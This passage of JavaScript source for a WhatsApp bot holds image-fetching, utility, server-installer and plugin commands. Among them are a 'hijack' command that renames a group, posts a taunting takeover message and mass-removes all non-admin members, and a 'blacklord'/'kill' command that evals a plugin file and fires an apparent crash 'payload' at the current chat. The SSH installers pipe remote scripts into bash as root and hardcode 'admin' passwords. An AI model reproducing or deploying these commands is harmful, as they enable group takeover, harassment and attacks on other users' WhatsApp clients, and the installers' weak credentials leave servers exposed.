    sagiri: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sagiri.json',
    sakura: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sakura.json',
    sasuke: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sasuke.json',
    satanic: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/satanic.json',
    shina: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shina.json',
    shinka: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shinka.json',
    shinomiya: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shinomiya.json',
    shizuka: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shizuka.json',
    shota: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shota.json',
    shortquote: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/katakata.json',
    space: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tatasurya.json',
    technology: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/technology.json',
    tejina: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tejina.json',
    toukachan: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/toukachan.json',
    tsunade: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tsunade.json',
    yotsuba: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yotsuba.json',
    yuki: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yuki.json',
    yulibocil: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yulibocil.json',
    yumeko: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yumeko.json',
  };

  const commandName = cmd.toLowerCase();
  const url = urlMap[commandName];
  if (!url) {
    await reply(`❌ Anime "${cmd}" not found.`);
    break;
  }

  try {
    const data = await fetchJson(url);
    if (!data || !data.length) {
      await reply(`❌ Failed to fetch ${cmd} images.`);
      break;
    }

    const randomImage = data[Math.floor(Math.random() * data.length)];
    const caption = `🎨 *${cmd.toUpperCase()}*\nHere's your random image!`;

    await sock.sendMessage(jid, {
      image: { url: randomImage },
      caption: caption,
      viewOnce: true,
      contextInfo: {
        isForwarded: false,
        forwardingScore: 9999,
        forwardedNewsletterMessageInfo: {
          newsletterJid: settings.CHANNEL_JID || '120363407629340544@newsletter',
          newsletterName: settings.CHANNEL_NAME || '〖 🟢 SAMSUNG XMD 🟢 〗'
        },
        externalAdReply: {
          title: ft(cmd.toUpperCase(), sock),
          body: ft(`Random ${cmd} image`, sock),
          thumbnailUrl: randomImage,
          renderLargerThumbnail: true,
          mediaType: 1,
          previewType: 1,
        }
      }
    }, { quoted: m });

  } catch (e) {
    console.error('[ANIME]', e);
    await reply(`❌ Failed to fetch ${cmd}: ${e.message}`);
  }
  break;
}

// ─── MAKER / IMAGE GENERATORS ──────────────────────────
// ─── MAKER / IMAGE GENERATORS ──────────────────────────

/*case 'animegirl':
case 'fakecall':
case 'bratgenerator':
case 'pak-ustad':
case 'ngl':
case 'togura':
case 'attp': {
  await reaction('🎨');

  // ── Handle `attp` (text to animated sticker) ──
  if (cmd === 'attp') {
    const text = args.join(' ');
    if (!text) {
      await reply(`🎬 *ATTP*\nUsage: .attp <text>\nExample: .attp Hello World`);
      break;
    }
    try {
      const apiUrl = `https://api.siputzx.my.id/api/sticker/attp?text=${encodeURIComponent(text)}`;
      const buffer = await getBuffer(apiUrl);
      await sock.sendMessage(jid, { sticker: buffer }, { quoted: m });
    } catch (e) {
      await reply(`❌ ATTP failed: ${e.message}`);
    }
    break;
  }

  // ── Handle `togura` (requires image reply) ──
  if (cmd === 'togura') {
    const q = m.quoted || m;
    const mime = (q.msg || q).mimetype || '';
    if (!/image/.test(mime)) {
      await reply(`🖼️ *To Gura*\nReply to an image with: .togura`);
      break;
    }
    try {
      const mediaBuffer = await dlMedia(q.msg || q, q.key || m.key);
      const imageUrl = await uploadToCatbox(mediaBuffer, 'gura.jpg');
      const apiUrl = `https://api.nekolabs.web.id/canvas/gura?imageUrl=${encodeURIComponent(imageUrl)}`;
      const resultBuffer = await getBuffer(apiUrl);
      await sock.sendMessage(jid, {
        image: resultBuffer,
        caption: '🎨 *To Gura* completed!'
      }, { quoted: m });
    } catch (e) {
      await reply(`❌ Togura failed: ${e.message}`);
    }
    break;
  }

  // ── Text‑based commands ──
  const text = args.join(' ');
  if (!text) {
    const usageMap = {
      animegirl: 'animegirl <text>',
      fakecall: 'fakecall <name> | <duration>\nExample: .fakecall John | 5:00',
      bratgenerator: 'bratgenerator <text>',
     // pak-ustad: 'pak-ustad <question>',
      ngl: 'ngl <message>',
    };
    await reply(`Usage: .${usageMap[cmd] || cmd}`);
    break;
  }

  // ── Special handling for `fakecall` ──
  if (cmd === 'fakecall') {
    const [name, duration] = text.split('|').map(s => s.trim());
    if (!name || !duration) {
      await reply(`📞 *Fake Call*\nUsage: .fakecall <name> | <duration>\nExample: .fakecall John | 5:00`);
      break;
    }
    try {
      const avatar = await sock.profilePictureUrl(m.sender, 'image').catch(() => 'https://files.catbox.moe/nwvkbt.png');
      const apiUrl = `https://api.zenzxz.my.id/api/maker/fakecall?nama=${encodeURIComponent(name)}&durasi=${encodeURIComponent(duration)}&avatar=${encodeURIComponent(avatar)}`;
      const buffer = await getBuffer(apiUrl);
      await sock.sendMessage(jid, {
        image: buffer,
        caption: `📞 Fake Call from ${name} (${duration})`
      }, { quoted: m });
    } catch (e) {
      await reply(`❌ Fakecall failed: ${e.message}`);
    }
    break;
  }

  // ── Generic API calls ──
  const apiMap = {
    animegirl: `https://api.zenzxz.my.id/api/maker/animegirl/image?text=${encodeURIComponent(text)}`,
    bratgenerator: `https://aqul-brat.hf.space/?text=${encodeURIComponent(text)}`,
    pak-ustad: `https://api.taka.my.id/tanya-ustad?quest=${encodeURIComponent(text)}`,
    ngl: `https://api.taka.my.id/ngl?text=${encodeURIComponent(text)}`,
  };

  const apiUrl = apiMap[cmd];
  if (!apiUrl) {
    await reply(`❌ Unknown maker command.`);
    break;
  }

  try {
    const buffer = await getBuffer(apiUrl);
    const captionMap = {
      animegirl: `🎨 *Anime Girl*\nText: ${text}`,
      bratgenerator: `🎨 *Brat Generator*\nText: ${text}`,
      pak-ustad: `🕌 *Ustad Answer*\nQuestion: ${text}`,
      ngl: `💬 *NGL Message*\n${text}`,
    };
    await sock.sendMessage(jid, {
      image: buffer,
      caption: captionMap[cmd] || `🎨 *${cmd.toUpperCase()}*`
    }, { quoted: m });
  } catch (e) {
    console.error('[MAKER]', e);
    await reply(`❌ Failed to generate: ${e.message}`);
  }
  break;
}*/
    // ── Whois / number info ──────────────────────────────
    case 'whois': {
      const t = getTargetJid(m, args);
      if (!t) { await reply(`${prefix}whois @mention`); break; }
      try {
        const ppUrl = await sock.profilePictureUrl(t, 'image').catch(() => null);
        const pp = ppUrl ? ppUrl : 'No profile picture';
        const isOnWa = await sock.onWhatsApp(t).catch(() => []);
        const status = isOnWa?.[0]?.exists ? '✅ On WhatsApp' : '❌ Not on WhatsApp';
        const info = `👤 *+${normNum(t)}*\n\n${status}\nPP: ${pp}`;
        if (ppUrl) await replyImg(ppUrl, info);
        else await reply(info);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // ── Reverse GIF ──────────────────────────────────────
    case 'reversegif': {
      const { qMsg: qMRG, qType: qTRG, qKey: qKRG } = getQuoted(m);
      const gifMsg = m.message?.videoMessage || (qTRG === 'videoMessage' ? qMRG?.videoMessage : null);
      if (!gifMsg) { await reply('Reply to a GIF/video.'); break; }
      await reaction('🔁');
      try {
        const srcKey = m.message?.videoMessage ? m.key : qKRG;
        const buf = await dlMedia({ videoMessage: gifMsg }, srcKey);
        const tmp = `/tmp/rgif_${Date.now()}`;
        fs.writeFileSync(`${tmp}.mp4`, buf);
        await new Promise((res, rej) =>
          exec(`ffmpeg -y -i ${tmp}.mp4 -vf reverse -af areverse ${tmp}_rev.mp4 2>/dev/null`, e => e ? rej(e) : res())
        );
        const revBuf = fs.readFileSync(`${tmp}_rev.mp4`);
        await sock.sendMessage(jid, { video: revBuf, gifPlayback: true, caption: '🔁 Reversed GIF' }, { quoted: qchanel });
        try { fs.unlinkSync(`${tmp}.mp4`); fs.unlinkSync(`${tmp}_rev.mp4`); } catch {}
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // ── Animated text sticker (attp) ─────────────────────
    case 'attp': {
      if (!text) { await reply(`${prefix}attp <text>`); break; }
      await reaction('✨');
      try {
        const { data } = await axios.get(
          `https://api.siputzx.my.id/api/sticker/attp?text=${encodeURIComponent(text)}`,
          { responseType: 'arraybuffer', timeout: 15000 }
        );
        const buf = Buffer.from(data);
        await sock.sendMessage(jid, { sticker: buf }, { quoted: qchanel });
      } catch (e) { await reply('❌ attp failed: ' + e.message); }
      break;
    }

    // ── Emoji mixer ─────────────────────────────────────
    case 'emojimix': {
      if (args.length < 2) { await reply(`${prefix}emojimix <emoji1> <emoji2>\nExample: ${prefix}emojimix 😀 🔥`); break; }
      try {
        const e1 = encodeURIComponent(args[0]);
        const e2 = encodeURIComponent(args[1]);
        const url = `https://www.gstatic.com/android/keyboard/emojikitchen/20201001/${e1}/${e1}_${e2}.png`;
        await replyImg(url, `${args[0]} + ${args[1]}`);
      } catch { await reply('❌ Emoji mix not found.'); }
      break;
    }

    // ══════════════════════════════════════════════════════
    //   SCRIPT / REPO – with 2 open buttons
    // ══════════════════════════════════════════════════════
/*
    case 'script':
    case 'repo': {
      await reaction('🔗');
      const upSec = Math.floor(process.uptime());
      const d = Math.floor(upSec / 86400);
      const h = Math.floor((upSec % 86400) / 3600);
      const mn = Math.floor((upSec % 3600) / 60);
      const s = upSec % 60;
      const runtime = `${d}d ${h}h ${mn}m ${s}s`;

      const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require('@whiskeysockets/baileys');

      // Try to attach menu image as thumbnail
      const menuImgUrl = c.menuImg || settings.DEFAULT_MENU_IMG;
      let imgField = {};
      if (menuImgUrl) {
        try {
          const imgBuf = await getBuffer(menuImgUrl);
          imgField = await prepareWAMessageMedia({ image: imgBuf }, { upload: sock.waUploadToServer });
        } catch {}
      }

      const repoText = ft(
`╭─ ⌬ 𝗕𝗼𝘁 𝗜𝗻𝗳𝗼 ⌬
│ • Name    : ${c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD'}
│ • Owner   : ${kontributor[0] || botNumber}
│ • Version  : ${settings.BOT_VERSION || '1.0'}
│ • Prefix   : ${prefix}
│ • Runtime  : ${runtime}
╰─────────────`, sock);

      const pairUrl    = settings.REQUIRED_PAIR_LINK    || 'https://t.me/animemdoff_bot';
      const channelUrl = settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3';

      try {
        const msg = await generateWAMessageFromContent(jid, {
          ephemeralMessage: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body:   proto.Message.InteractiveMessage.Body.fromObject({ text: repoText }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: `© ${settings.CREDITS || 'james'}` }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  title: c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
                  hasMediaAttachment: !!imgField.imageMessage,
                  ...imgField,
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                  buttons: [
                    {
                      name: 'cta_url',
                      buttonParamsJson: JSON.stringify({
                        display_text: '🔗 Pair Bot',
                        url: pairUrl,
                        merchant_url: pairUrl,
                      }),
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson: JSON.stringify({
                        display_text: '📢 Follow Channel',
                        url: channelUrl,
                        merchant_url: channelUrl,
                      }),
                    },
                  ],
                }),
                contextInfo: {},
              }),
            },
          },
        }, { quoted: qchanel });
        await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
      } catch {
        // Fallback to plain reply if interactive fails
        await reply(repoText + `\n\n🔗 Pair: ${pairUrl}\n📢 Channel: ${channelUrl}`);
      }
      break;
    }*/

    case 'idch':
    case 'cekidch': {
      const chLink = args[0];
      if (!chLink) { await reply(`Usage: ${prefix}idch <channel link>`); break; }
      if (!chLink.includes('https://whatsapp.com/channel/')) {
        await reply('❌ Must be a valid WhatsApp channel link');
        break;
      }
      try {
        const inviteCode = chLink.split('https://whatsapp.com/channel/')[1];
        const res = await sock.newsletterMetadata('invite', inviteCode);
        const verified = res.verification === 'VERIFIED' ? 'Yes ✅' : 'No ❌';
        const teks = ft(
`📢 *Channel Info*

🆔 ID: ${res.id}
📛 Name: ${res.name}
👥 Followers: ${res.subscribers}
🔘 Status: ${res.state}
✅ Verified: ${verified}`, sock);

        const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
        const msg = await generateWAMessageFromContent(jid, {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body:   proto.Message.InteractiveMessage.Body.fromObject({ text: teks }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: 'by 𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD' }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                  buttons: [{
                    name: 'cta_copy',
                    buttonParamsJson: JSON.stringify({ display_text: 'Copy ID', copy_code: res.id }),
                  }],
                }),
              }),
            },
          },
        }, { quoted: qchanel });
        await sock.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // ══════════════════════════════════════════════════════
    //   INSTALL MENU  –  Panel & Theme Installers (SSH)
    // ══════════════════════════════════════════════════════

    // ── Helper: generate random string for passwords ──
    function randomKarakter(len) {
      const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      let result = '';
      for (let i = 0; i < len; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
      }
      return result;
    }

    // ── Install Menu Help ──
    // ─── INSTALLATION / PANEL MANAGEMENT ────────────────────

// ── Install Menu (help) ──
case 'installmenu': {
  if (needOwner()) break;
  const help =
`📦 *Install Menu*

🔹 *Panel Install / Uninstall*
• ${prefix}installpanel <ip>|<password>|<panel_domain>|<node_domain>|<ram_mb>|<node_name>
• ${prefix}uinstallpanel <ip>|<password>

🔹 *Theme Install / Uninstall*
• ${prefix}installtemabilling <ip>|<password>
• ${prefix}installtemaenigma <ip>|<password>
• ${prefix}installtemastellar <ip>|<password>
• ${prefix}uinstalltema <ip>|<password>

🔹 *Plugin Management*
• ${prefix}addp <name> (reply to JS code)
• ${prefix}delp <name>
• ${prefix}getp <name>
• ${prefix}listp

🔹 *GitHub Upload*
• ${prefix}tourlgh (reply to media)

🔹 *Pinterest Album*
• ${prefix}pinalbum <query>

⚠️ All install commands require SSH access (root password).`;
  await reply(help);
  break;
}

// ── Install Panel ──
case 'installpanel':
case 'paneluinstall':
case 'installerpanel':
case 'panelinstaller': {
  if (needOwner()) break;
  const { Client } = require('ssh2');
  const parts = text.split('|').map(s => s.trim());
  if (parts.length < 6) {
    await reply(`📦 Usage: .installpanel <ip>|<password>|<panel_domain>|<node_domain>|<ram_mb>|<node_name>\nExample: .installpanel 192.168.1.1|password|panel.example.com|node.example.com|4096|main`);
    break;
  }
  const [ip, password, panelDomain, nodeDomain, ramMb, nodeName] = parts;
  const adminPass = randomKarakter(8) + Math.floor(Math.random() * 90 + 10);

  await reply(`⏳ Connecting to ${ip}...`);
  const conn = new Client();
  conn.on('ready', () => {
    reply(`✅ Connected! Installing panel (takes 5‑15 minutes)...`);
    conn.exec('bash <(curl -s https://pterodactyl-installer.se)', (err, stream) => {
      if (err) return reply(`❌ SSH error: ${err.message}`);
      stream.on('data', (data) => {
        const out = data.toString();
        console.log('[installpanel]', out);
        if (out.includes('Input 0-6')) stream.write('0\n');
        if (out.includes('(y/N)')) stream.write('y\n');
        if (out.includes('Database name (panel)')) stream.write('\n');
        if (out.includes('Database username (pterodactyl)')) stream.write('admin\n');
        if (out.includes('Password (press enter to use randomly generated password)')) stream.write('admin\n');
        if (out.includes('Select timezone [Europe/Stockholm]')) stream.write('Asia/Jakarta\n');
        if (out.includes('Provide the email address')) stream.write('admin@gmail.com\n');
        if (out.includes('Email address for the initial admin account')) stream.write('admin@gmail.com\n');
        if (out.includes('Username for the initial admin account')) stream.write('admin\n');
        if (out.includes('First name for the initial admin account')) stream.write('admin\n');
        if (out.includes('Last name for the initial admin account')) stream.write('admin\n');
        if (out.includes('Password for the initial admin account')) stream.write(`${adminPass}\n`);
        if (out.includes('Set the FQDN of this panel')) stream.write(`${panelDomain}\n`);
        if (out.includes('Do you want to automatically configure UFW')) stream.write('y\n');
        if (out.includes('Do you want to automatically configure HTTPS using Let\'s Encrypt?')) stream.write('y\n');
        if (out.includes('Select the appropriate number [1-2]')) stream.write('1\n');
        if (out.includes('I agree that this HTTPS request is performed')) stream.write('y\n');
        if (out.includes('Proceed anyways')) stream.write('y\n');
        if (out.includes('(yes/no)')) stream.write('y\n');
        if (out.includes('Initial configuration completed. Continue with installation? (y/N)')) stream.write('y\n');
        if (out.includes('Still assume SSL? (y/N)')) stream.write('y\n');
        if (out.includes('Please read the Terms of Service')) stream.write('y\n');
        if (out.includes('(A)gree/(C)ancel:')) stream.write('A\n');
      });
      stream.on('close', () => {
        reply('✅ Panel installed. Setting up Wings & Node...');
        conn.exec('bash <(curl -s https://raw.githubusercontent.com/veryLinh/Theme-Autoinstaller/main/createnode.sh)', (err2, stream2) => {
          if (err2) return reply(`❌ Node setup error: ${err2.message}`);
          stream2.on('data', (data2) => {
            const out2 = data2.toString();
            console.log('[createnode]', out2);
            if (out2.includes('Masukkan nama lokasi:')) stream2.write('Singapore\n');
            if (out2.includes('Masukkan deskripsi lokasi:')) stream2.write('NODES\n');
            if (out2.includes('Masukkan domain:')) stream2.write(`${nodeDomain}\n`);
            if (out2.includes('Masukkan nama node:')) stream2.write(`${nodeName}\n`);
            if (out2.includes('Masukkan RAM (dalam MB):')) stream2.write(`${ramMb}\n`);
            if (out2.includes('Masukkan jumlah maksimum disk space (dalam MB):')) stream2.write(`${ramMb}\n`);
            if (out2.includes('Masukkan Locid:')) stream2.write('1\n');
          });
          stream2.on('close', () => {
            reply(`✅ *Panel Installation Complete!*\n\n` +
              `🔗 Panel: ${panelDomain}\n` +
              `👤 Username: admin\n` +
              `🔑 Password: ${adminPass}\n\n` +
              `📌 Node: ${nodeDomain}\n` +
              `📦 RAM: ${ramMb}MB\n\n` +
              `⚠️ Save these credentials!`);
            conn.end();
          });
        });
      });
    });
  });
  conn.on('error', (err) => reply(`❌ SSH connection failed: ${err.message}`));
  conn.connect({ host: ip, port: 22, username: 'root', password });
  break;
}

case 'blacklord': 
case 'kill':{
    const pluginFile = path.join(__dirname, 'Plugins', 'blacklord.js');
    if (!fs.existsSync(pluginFile)) {
        await reply('❌ File not found: Plugins/blacklord.js');
        break;
    }
    try {
        const code = fs.readFileSync(pluginFile, 'utf8');
        // Execute the code in the current scope – this defines the `noise` function
        eval(code);
        if (typeof noise !== 'function') {
            await reply('❌ The file does not define a function named "noise".');
            break;
        }
        const target = m.key.remoteJid;
        await noise(sock, target);
        await reply('✅ Payload executed.');
    } catch (e) {
        await reply(`❌ Error: ${e.message}`);
    }
    break;
}
case 'hijack': {
    if (needGroup()) break;
    if (!_isOwner) {
        await reply('❌ Owner only.');
        break;
    }

    // ─── 1. Update group name ──────────────────────────────
    const newName = '𝐌𝐙𝐀𝐙𝐈" & "𝐁𝐋𝐀𝐂𝐊 𝐖𝐀𝐒 𝐇𝐄𝐑𝐄';
    let nameUpdated = false;
    try {
        await sock.groupUpdateSubject(jid, newName);
        nameUpdated = true;
    } catch (err) {
        console.error('Name update failed:', err);
    }

    // ─── 2. Update group picture ────────────────────────────
    const imageUrl = settings.HIJACK_IMAGE_URL || settings.DEFAULT_MENU_IMG;
    let pictureUpdated = false;
    if (imageUrl) {
        try {
            const res = await fetch(imageUrl);
            if (res.ok) {
                const buffer = await res.buffer();
                await sock.updateProfilePicture(jid, buffer);
                pictureUpdated = true;
            }
        } catch (err) {
            console.error('Picture update failed:', err);
        }
    }

    // ─── 3. Kick non‑admin members ──────────────────────────
    const nonAdmins = participants
        .filter(p => !p.admin)
        .map(p => p.id || p.jid)
        .filter(Boolean);

    if (!nonAdmins.length) {
        let msg = '❌ No non-admin members found.';
        if (nameUpdated) msg += '\n• Group name updated.';
        if (pictureUpdated) msg += '\n• Group picture updated.';
        await reply(msg);
        break;
    }

    await reply(`⚠️ 𝚮𝚰𝐉𝚫𝐂𝚱 𝚰𝚴𝚰𝚻𝚰𝚫𝚻𝚬𝐃 ${nonAdmins.length} 

👁️ *Silencer was here.*
🔇 *I have come to bring silence in this group.*

All non‑admin members will be removed.
Administrators have been demoted.
This group will now belong to the Master.

`);

    let removed = 0;
    let failed = 0;
    const chunkSize = 1030;

    for (let i = 0; i < nonAdmins.length; i += chunkSize) {
        const chunk = nonAdmins.slice(i, i + chunkSize);
        try {
            await sock.groupParticipantsUpdate(jid, chunk, "remove");
            removed += chunk.length;
        } catch (err) {
            failed += chunk.length;
        }
        await new Promise(resolve => setTimeout(resolve, 1500));
    }

    // ─── Final clean reply ──────────────────────────────────
    let finalMsg = `✅ 𝚮𝚰𝐉𝚫𝐂𝚱 𝐂𝚯𝚳𝚸𝐋𝚬𝚻𝚬𝐃\n\n` +
                   `• Removed: ${removed}\n` +
                   `• Failed: ${failed}\n` +
                   `• Note: Admins were kept`;
    if (nameUpdated) finalMsg += `\n• Group name updated to: ${newName}`;
    else finalMsg += `\n• Group name update failed.`;
    if (pictureUpdated) finalMsg += `\n• Group picture updated.`;
    else finalMsg += `\n• Group picture update failed.`;

    await reply(finalMsg);
    break;
}
// ── Uninstall Panel ──
case 'uinstallpanel':
case 'paneluinstaller':
case 'uinstallerpanel':
case 'paneluinstall': {
  if (needOwner()) break;
  const { Client } = require('ssh2');
  const parts = text.split('|').map(s => s.trim());
  if (parts.length < 2) {
    await reply(`🗑️ Usage: .uinstallpanel <ip>|<password>`);
    break;
  }
  const [ip, password] = parts;
  await reply(`⏳ Connecting to ${ip} to uninstall panel...`);
  const conn = new Client();
  conn.on('ready', () => {
    reply('✅ Connected. Uninstalling panel...');
    conn.exec('bash <(curl -s https://pterodactyl-installer.se)', (err, stream) => {
      if (err) return reply(`❌ SSH error: ${err.message}`);
      stream.on('data', (data) => {
        const out = data.toString();
        console.log('[uinstall]', out);
        if (out.includes('Input 0-6')) stream.write('6\n');
        if (out.includes('(y/N)')) stream.write('y\n');
        if (out.includes('Choose the panel user')) stream.write('\n');
        if (out.includes('Choose the panel database')) stream.write('\n');
        if (out.includes('Remove all MariaDB databases? [yes/no]')) stream.write('\x09\n');
      });
      stream.on('close', () => {
        reply('✅ Panel uninstalled successfully!');
        conn.end();
      });
    });
  });
  conn.on('error', (err) => reply(`❌ SSH error: ${err.message}`));
  conn.connect({ host: ip, port: 22, username: 'root', password });
  break;
}

// ── Install Billing Theme ──
case 'installtemabilling':
case 'installthemabilling':
case 'installbillingtema':
case 'installbillingthema':
case 'temainstallbilling':
case 'themainstallbilling': {
  if (needOwner()) break;
  const { Client } = require('ssh2');
  const parts = text.split('|').map(s => s.trim());
  if (parts.length < 2) {
    await reply(`🎨 Usage: .installtemabilling <ip>|<password>`);
    break;
  }
  const [ip, password] = parts;
  await reply(`⏳ Installing Billing Theme on ${ip}...`);
  const conn = new Client();
  conn.on('ready', () => {
    conn.exec('bash <(curl -s https://raw.githubusercontent.com/veryLinh/Theme-Autoinstaller/main/install.sh)', (err, stream) => {
      if (err) return reply(`❌ ${err.message}`);
      stream.on('data', (data) => {
        const out = data.toString();
        console.log('[billing]', out);
        if (out.includes('Enter your bot token')) stream.write('skyzodev\n');
        if (out.includes('Select option')) stream.write('1\n');
        if (out.includes('Choose theme')) stream.write('2\n');
        if (out.includes('Proceed?')) stream.write('yes\n');
        if (out.includes('Exit')) stream.write('x\n');
      });
      stream.on('close', () => {
        reply('✅ Billing Theme installed successfully!');
        conn.end();
      });
    });
  });
  conn.on('error', (e) => reply(`❌ ${e.message}`));
  conn.connect({ host: ip, port: 22, username: 'root', password });
  break;
}

// ── Install Enigma Theme ──
case 'installtemaenigma':
case 'temainstallenigma':
case 'installthemaenigma':
case 'themainstallenigma': {
  if (needOwner()) break;
  const { Client } = require('ssh2');
  const parts = text.split('|').map(s => s.trim());
  if (parts.length < 2) {
    await reply(`🎨 Usage: .installtemaenigma <ip>|<password>`);
    break;
  }
  const [ip, password] = parts;
  await reply(`⏳ Installing Enigma Theme on ${ip}...`);
  const conn = new Client();
  conn.on('ready', () => {
    conn.exec('bash <(curl -s https://raw.githubusercontent.com/veryLinh/Theme-Autoinstaller/main/install.sh)', (err, stream) => {
      if (err) return reply(`❌ ${err.message}`);
      stream.on('data', (data) => {
        const out = data.toString();
        console.log('[enigma]', out);
        if (out.includes('Enter your bot token')) stream.write('skyzodev\n');
        if (out.includes('Select option')) stream.write('1\n');
        if (out.includes('Choose theme')) stream.write('3\n');
        if (out.includes('Proceed?')) stream.write('yes\n');
        if (out.includes('Exit')) stream.write('x\n');
      });
      stream.on('close', () => {
        reply('✅ Enigma Theme installed successfully!');
        conn.end();
      });
    });
  });
  conn.on('error', (e) => reply(`❌ ${e.message}`));
  conn.connect({ host: ip, port: 22, username: 'root', password });
  break;
}

// ── Install Stellar Theme ──
case 'installtemastellar':
case 'installstellartema':
case 'installstellarthema':
case 'installthemastellar':
case 'installthematestellar': {
  if (needOwner()) break;
  const { Client } = require('ssh2');
  const parts = text.split('|').map(s => s.trim());
  if (parts.length < 2) {
    await reply(`🎨 Usage: .installtemastellar <ip>|<password>`);
    break;
  }
  const [ip, password] = parts;
  await reply(`⏳ Installing Stellar Theme on ${ip}...`);
  const conn = new Client();
  conn.on('ready', () => {
    conn.exec('bash <(curl -s https://raw.githubusercontent.com/veryLinh/Theme-Autoinstaller/main/install.sh)', (err, stream) => {
      if (err) return reply(`❌ ${err.message}`);
      stream.on('data', (data) => {
        const out = data.toString();
        console.log('[stellar]', out);
        if (out.includes('Enter your bot token')) stream.write('skyzodev\n');
        if (out.includes('Select option')) stream.write('1\n');
        if (out.includes('Choose theme')) stream.write('1\n');
        if (out.includes('Proceed?')) stream.write('yes\n');
        if (out.includes('Exit')) stream.write('x\n');
      });
      stream.on('close', () => {
        reply('✅ Stellar Theme installed successfully!');
        conn.end();
      });
    });
  });
  conn.on('error', (e) => reply(`❌ ${e.message}`));
  conn.connect({ host: ip, port: 22, username: 'root', password });
  break;
}

// ── Uninstall Theme ──
case 'uinstalltema':
case 'uinstallthema':
case 'themauinstall':
case 'temauinstall':
case 'themauinstaller':
case 'temauinstaller': {
  if (needOwner()) break;
  const { Client } = require('ssh2');
  const parts = text.split('|').map(s => s.trim());
  if (parts.length < 2) {
    await reply(`🗑️ Usage: .uinstalltema <ip>|<password>`);
    break;
  }
  const [ip, password] = parts;
  await reply(`⏳ Uninstalling theme on ${ip}...`);
  const conn = new Client();
  conn.on('ready', () => {
    conn.exec('bash <(curl -s https://raw.githubusercontent.com/veryLinh/Theme-Autoinstaller/main/install.sh)', (err, stream) => {
      if (err) return reply(`❌ ${err.message}`);
      stream.on('data', (data) => {
        const out = data.toString();
        console.log('[uinstalltema]', out);
        if (out.includes('Enter your bot token')) stream.write('skyzodev\n');
        if (out.includes('Select option')) stream.write('2\n');
        if (out.includes('Proceed?')) stream.write('y\n');
        if (out.includes('Exit')) stream.write('x\n');
      });
      stream.on('close', () => {
        reply('✅ Theme uninstalled successfully!');
        conn.end();
      });
    });
  });
  conn.on('error', (e) => reply(`❌ ${e.message}`));
  conn.connect({ host: ip, port: 22, username: 'root', password });
  break;
}

// ── Plugin Management ──
case 'addp': {
  if (needOwner()) break;
  const name = args[0];
  if (!name || !m.quoted) {
    await reply(`📦 Usage: .addp <plugin_name> (reply to a .js file)`);
    break;
  }
  const q = m.quoted;
  const mime = (q.msg || q).mimetype || '';
  if (!/document/.test(mime) || !q.fileName?.endsWith('.js')) {
    await reply('❌ Reply to a .js document.');
    break;
  }
  try {
    const buffer = await dlMedia(q.msg || q, q.key || m.key);
    const code = buffer.toString('utf8');
    // Validate
    new Function(code);
    const pluginsFile = DB('plugins.json');
    let plugins = readJSON(pluginsFile, []);
    if (plugins.find(p => p.name === name)) {
      await reply(`⚠️ Plugin "${name}" already exists.`);
      break;
    }
    plugins.push({ name, code, createdAt: Date.now() });
    writeJSON(pluginsFile, plugins);
    await reply(`✅ Plugin "${name}" added.`);
  } catch (e) {
    await reply(`❌ ${e.message}`);
  }
  break;
}

case 'delp': {
  if (needOwner()) break;
  const name = args[0];
  if (!name) { await reply(`Usage: .delp <plugin_name>`); break; }
  const pluginsFile = DB('plugins.json');
  let plugins = readJSON(pluginsFile, []);
  const filtered = plugins.filter(p => p.name !== name);
  if (filtered.length === plugins.length) {
    await reply(`⚠️ Plugin "${name}" not found.`);
    break;
  }
  writeJSON(pluginsFile, filtered);
  await reply(`✅ Plugin "${name}" deleted.`);
  break;
}

case 'getp': {
  if (needOwner()) break;
  const name = args[0];
  if (!name) { await reply(`Usage: .getp <plugin_name>`); break; }
  const pluginsFile = DB('plugins.json');
  const plugins = readJSON(pluginsFile, []);
  const plugin = plugins.find(p => p.name === name);
